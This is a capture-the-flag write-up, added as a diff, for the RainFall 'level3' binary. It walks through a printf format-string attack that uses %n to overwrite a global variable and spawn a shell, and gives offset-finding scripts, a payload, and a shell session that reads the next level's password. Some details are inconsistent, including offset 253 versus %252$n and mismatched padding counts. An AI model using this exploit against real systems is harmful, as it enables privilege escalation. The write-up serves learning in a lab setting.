@@ -1,1 +1,72 @@
 # level3
+
+The `main` function of this exercise calls a function called `v` :
+
+```c
+void v(void) {
+	char buffer[520];
+	fgets(buffer, 512, stdin);
+	printf(buffer);
+	if (m == 64) {
+		fwrite("Wait what?!\n", 1, 12, stdout);
+		system("/bin/sh");
+	}
+	return;
+}
+
+This code might seems normal at a first glance, however `printf` only has one argument. Which means that this code is vulnerable to a format string attack.
+
+The variable `m` is a global variable that is set to 0, so we somehow have to set it to 64 in order to get a shell.
+
+This could be done using the `%n` format specifier, which writes the number of printed characters to the address of the argument.
+
+To exploit this binary there are few requirements:
+
+1. The address of `m` needs to be known
+2. The address of `m` must be on the stack
+3. We need to know how many elements we have to skip/pop from the stack before we reach the address of `m`
+
+The address of `m` can be found using `objdump`:
+
+```bash
+$ objdump -t level3 | grep \.bss | grep m
+0804988c g     O .bss   00000004              m
+```
+To find out how many elements we have to skip we can use a custom python script:
+
+```python
+import subprocess
+import sys
+args = ["./level3", "AAAA"]
+
+for i in range(0, 256):
+	p = subprocess.Popen(args, stdin=subprocess.PIPE, stdout=subprocess.PIPE)
+	payload = "%{}$x\n".format(i)
+	p.stdin.write(payload)
+	p.stdin.flush()
+	out = p.stdout.readline().strip()
+	if out == "41414141":
+		print("Found at index {}".format(i))
+		break
+```
+
+> Found at index 253
+
+So we have to push our stack address, then write 64 characters and then use the `%n` to write the number of printed characters to the address of `m`.
+
+```python
+import struct
+with open("/tmp/payload", "wb") as f:
+	f.write(struct.pack("I", 0x0804988c))
+```
+
+```bash
+level3@RainFall:~$ ./level3 `cat /tmp/payload`
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA%252$n
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+Wait what?!
+$ id
+uid=2022(level3) gid=2022(level3) euid=2025(level4) egid=100(users) groups=2025(level4),100(users),2022(level3)
+$ cat /home/user/level4/.pass
+b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa
+```
